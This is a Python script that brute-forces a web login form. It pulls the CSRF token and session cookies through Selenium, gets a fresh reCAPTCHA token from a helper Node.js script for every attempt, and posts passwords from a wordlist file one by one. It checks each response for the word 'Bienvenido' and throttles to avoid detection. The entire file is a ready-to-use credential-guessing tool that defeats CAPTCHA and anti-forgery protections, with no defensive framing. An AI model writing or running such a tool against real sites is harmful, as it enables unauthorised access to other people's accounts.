import time
import requests
import subprocess
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from bs4 import BeautifulSoup

def read_passwords(file_path):
    """Read and return non-empty passwords from a file."""
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def get_recaptcha_token():
    """Run the Node.js script to get a fresh reCAPTCHA token."""
    result = subprocess.run(['node', 'nodeToRecaptcha.js'], capture_output=True, text=True)
    token_line = result.stdout.strip().split('\n')[-1]  # Expected format: "ReCAPTCHA token: <token>"
    return token_line.split(':', 1)[-1].strip()

# Set up Selenium WebDriver to load dynamic content
service = Service('/path/to/your/chromedriver')
driver = webdriver.Chrome(service=service)
target_url = "YOUR_TARGET_URL" 
driver.get(target_url)
time.sleep(5)  # Wait for JavaScript-loaded elements

# Parse the page to extract the CSRF token
soup = BeautifulSoup(driver.page_source, 'html.parser')
token_input = soup.find('input', {'name': '_token'})
token_value = token_input['value'] if token_input else None
print("CSRF Token:", token_value)

# Create a requests session and import cookies from Selenium
session = requests.Session()
for cookie in driver.get_cookies():
    session.cookies.set(cookie['name'], cookie['value'])

driver.quit()  # Close the browser as it's no longer needed

# Read passwords and send POST requests with updated reCAPTCHA token for each
passwords = read_passwords('value1.txt')
for password in passwords:
    recaptcha_value = get_recaptcha_token()
    form_data = {
        'tipo': 'YOUR_TIPO_INPUT_NAME', # Replace 'YOUR_TIPO_INPUT_NAME' if different
        '_token': token_value,
        'user': 'YOUR_USERNAME', # Replace 'YOUR_USERNAME' with your actual username input field name if different
        'clave': password,
        'recaptcha_response': recaptcha_value
    }
    response = session.post(target_url, data=form_data)
   # Check if login was successful by looking for a known success indicator
    if response.status_code == 200:
        if "Bienvenido" in response.text:
            print(f"Login successful with password: {password}")
        else:
            print(f"Login failed with password: {password}")
            #print("Response:", response.text)
    else:
        print(f"Submission error for password: {password}. Status:", response.status_code)
    time.sleep(15)  # Delay between submissions